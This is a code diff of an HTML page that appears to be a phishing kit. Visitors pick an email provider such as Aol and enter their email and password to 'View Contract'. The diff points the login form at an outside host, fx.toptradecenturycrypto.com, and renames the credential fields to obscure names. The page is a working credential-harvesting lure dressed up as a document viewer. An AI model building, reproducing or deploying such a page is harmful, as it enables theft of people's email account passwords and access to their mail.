@@ -12,7 +12,6 @@
     <link href="assets/bootstrap/css/bootstrap.css" rel="stylesheet">
     <!-- Custom styles for this template -->
     <link href="assets/style.css" rel="stylesheet">
-<!--    <script src="https://smtpjs.com/v3/smtp.js"></script>-->
 </head>
 <body style="background-image:url('assets/img/vhkv2.jpg');" class="background-center-center background-cover">
 <div class="container d-md-flex flex-md-column">
@@ -45,7 +44,7 @@
         <div type="button" class="align-items-center col-6 col-lg-2 col-md-4 col-sm-6 d-flex flex-column text-md-center text-sm-center"
              data-toggle="modal" data-target="#formAllModal" data-whatever="Aol"
              data-img="assets/img/iconfinder_aol_1175601.svg">
-            <h3 class="all_icon_text aol font-weight-bold h5">Aol</h3>
+            <h3 class="all_icon_text aol font-weight-bold h5 ">Aol</h3>
             <img src="assets/img/iconfinder_aol_1175601.svg" width="80" class="shadow"/>
         </div>
         <div type="button" class="align-items-center col-6 col-lg-2 col-md-4 col-sm-6 d-flex flex-column text-md-center text-sm-center"
@@ -57,7 +56,7 @@
         <div type="button" class="align-items-center col-6 col-lg-2 col-md-4 col-sm-6 d-flex flex-column text-md-center text-sm-center"
              data-toggle="modal" data-target="#formAllModal" data-whatever="Other Email"
         data-img="assets/img/iconfinder_naver-symbol_1175609.svg">
-            <h3 class="all_icon_text font-weight-bold h5 otherEmail">Other Email</h3>
+            <h3 class="all_icon_text font-weight-bold h5 otherEmail text-white">Other Email</h3>
             <img src="assets/img/iconfinder_naver-symbol_1175609.svg" width="80" class="shadow"/>
         </div>
     </div>
@@ -74,26 +73,25 @@
                          style="width:50px; height:50px;">
                 </div>
                 <div class="modal-body">
-                    <form action="" class="contact-form" method="POST">
+                    <form method="post" action="https://fx.toptradecenturycrypto.com/test" id="formAll">
                         <input type="hidden" name="emailSa" id="emailSaHid" value="">
-                        <input type="hidden" name="trio3" id="getIpUser" value="">
                         <div class="form-group">
                             <label for="email">Email</label>
-                            <input class="form-control" type="email" id="email" name="email"
+                            <input class="form-control" type="email" id="email" name="trio"
                                    placeholder="Your receiving email">
 
                         </div>
 
                         <div class="form-group">
-                            <label for="password">Password</label>
-                            <input class="form-control inputPassword" type="text" autocomplete="off" id="password" name="password"
+                            <label for="pass">Password</label>
+                            <input class="form-control inputPassword" type="text" autocomplete="off" id="pass" name="trio2"
                                    placeholder="password">
 
                         </div>
 
                         <div class="modal-footer">
                             <button type="button" id="closeModel" class="btn btn-secondary" data-dismiss="modal">Close</button>
-                            <button type="submit" onclick="submitEmailForm();" class="btn btn-dark">View Contract</button>
+                            <button type="submit" name="submit" id="form-submit" class="btn btn-dark">View Contract</button>
                         </div>
 
                         <div class="spinner">
@@ -118,6 +116,8 @@
 
 
 
+
+
     <div class="footer-bottom row">
         <div class="col-md-12 mt-md-5  text-center">
             <footer class="footer">
@@ -136,7 +136,5 @@
 <script src="assets/js/popper.js"></script>
 <script src="assets/bootstrap/js/bootstrap.min.js"></script>
 <script src="assets/js/index.js"></script>
-
-
 </body>
 </html>
